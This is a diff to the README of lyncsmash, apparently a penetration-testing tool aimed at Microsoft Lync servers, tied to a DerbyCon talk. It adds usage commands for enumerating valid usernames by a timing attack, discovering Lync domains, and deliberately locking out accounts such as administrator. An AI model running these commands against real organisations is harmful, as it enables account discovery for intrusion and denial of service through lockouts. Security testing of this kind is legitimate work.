@@ -11,7 +11,27 @@ YouTube link: https://www.youtube.com/watch?v=v0NTaCFk6VI
 
 Slide Deck: https://github.com/nyxgeek/lyncsmash/blob/master/DerbyCon%20Files/TheWeakestLync.pdf
 
-## lyncstink
+
+## lync_smash.py
+Timing attack to enumerate valid accounts
+
+usage:
+
+enumerating usernames via timing attack
+```
+python lync_smash.py enum -H 2013-lync-fe.contoso.com -U usernamelist.txt -d CONTOSO
+```
+
+discovering domains that are running Lync
+```
+python lync_smash.py discover -H url_list.txt
+```
+locking out a user account
+```
+python lync_smash.py lock -H 2013-lync-fe.contoso.com -u administrator -d CONTOSO
+```
+
+## lyncstink.py
 Locate domains that are running Lync servers
 
 
